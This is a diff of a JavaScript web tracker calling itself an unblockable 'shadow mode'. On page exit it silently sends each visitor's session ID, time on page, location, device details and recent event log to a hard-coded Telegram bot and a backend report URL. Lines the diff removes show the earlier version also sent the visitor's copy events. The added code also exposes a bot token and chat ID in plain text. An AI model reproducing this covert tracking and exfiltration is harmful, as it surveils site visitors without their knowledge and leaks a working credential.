@@ -1,6 +1,6 @@
 // TAURUS TRACKER v5.5 (Shadow Mode / Backend Oriented)
 /**
- * TAURUS TRACKER v5.5 (Final System - Unified Reporting V32)
+ * TAURUS TRACKER v5.5 (Final System - Unified Reporting V33)
  * ----------------------------------
  * - Altyapı: Backend Oriented (Engellenemez Gölge Modu)
  * - Güvenlik: Middleware IP Gating & Server-side Reporting
@@ -49,55 +49,71 @@
             .replace(/'/g, '&#39;');
     }
 
-    // GLOBAL EXIT LISTENER - Single unified handler
+    // --- 5. TELEGRAM NOTIFICATION (STRICT SYNC FOR EXIT) ---
+    function sendTelegramSync(message) {
+        const botToken = window.cachedTelegramConfig?.botToken || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
+        const chatId = window.cachedTelegramConfig?.chatId || '6886010817';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const data = JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        });
+
+        if (navigator.sendBeacon) {
+            const blob = new Blob([data], { type: 'application/json' });
+            navigator.sendBeacon(url, blob);
+        } else {
+            fetch(url, {
+                method: 'POST',
+                body: data,
+                headers: { 'Content-Type': 'application/json' },
+                keepalive: true
+            }).catch(() => { });
+        }
+    }
+
+    // GLOBAL EXIT LISTENER - Single unified handler (Strictly Synchronous)
     function sendExitMessage() {
         if (exitSent || window.isInternalNav) return;
 
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
-        // Requirement: Duration should be at least 1s to avoid ghost reports
         if (duration < 1) return;
 
         exitSent = true;
 
-        // Requirement: Call Telegram Notification redundancy (Following user advice)
-        const tgShortMsg = `🛑 <b>EXIT REPORT [${sessionID}]</b>\n` +
-            `⏱ <b>Duration:</b> ${duration}s\n` +
-            `📍 <b>Page:</b> ${window.location.pathname}\n` +
-            `🌍 <b>Loc:</b> ${sessionData?.city || 'Unknown'}`;
-        sendTelegramNotification(tgShortMsg);
+        // Prepare Reports
+        const tgMsg = `🛑 <b>EXIT REPORT</b>\n` +
+            `ID: <code>${sessionID}</code>\n` +
+            `Süre: ${duration}s\n` +
+            `Sayfa: ${window.location.pathname}`;
 
-        // Build detailed log content
-        const rawLog = localHistory.slice(-50).join('\n');
-        const rawClipboard = localHistory.filter(e => e.includes('Copy:')).join('\n');
+        // FIRE IMMEDIATELY (No async/await)
+        sendTelegramSync(tgMsg);
 
+        const rawLog = localHistory.slice(-20).join('\n');
         const payload = {
             sessionID: sessionID || 'unknown',
             duration: duration,
             exitPage: window.location.pathname,
             location: `${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}`,
             deviceInfo: `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,
-            clipboard: escapeHTML(rawClipboard) || 'None',
-            eventLog: escapeHTML(rawLog) || 'No events recorded',
-            botToken: window.cachedTelegramConfig?.botToken || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE',
-            chatId: window.cachedTelegramConfig?.chatId || '6886010817'
+            eventLog: escapeHTML(rawLog) || 'No events recorded'
         };
 
-        const url = CONFIG.api.report;
-        const body = JSON.stringify(payload);
-        const blob = new Blob([body], { type: 'application/json' });
+        const reportUrl = CONFIG.api.report;
+        const reportBlob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
 
-        // STRATEGY: fetch with keepalive + sendBeacon as fallback
-        if (window.fetch && typeof window.fetch === 'function') {
-            fetch(url, {
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(reportUrl, reportBlob);
+        } else {
+            fetch(reportUrl, {
                 method: 'POST',
+                body: JSON.stringify(payload),
                 headers: { 'Content-Type': 'application/json' },
-                keepalive: true,
-                body: body
-            }).catch(() => {
-                if (navigator.sendBeacon) navigator.sendBeacon(url, blob);
-            });
-        } else if (navigator.sendBeacon) {
-            navigator.sendBeacon(url, blob);
+                keepalive: true
+            }).catch(() => { });
         }
     }
 
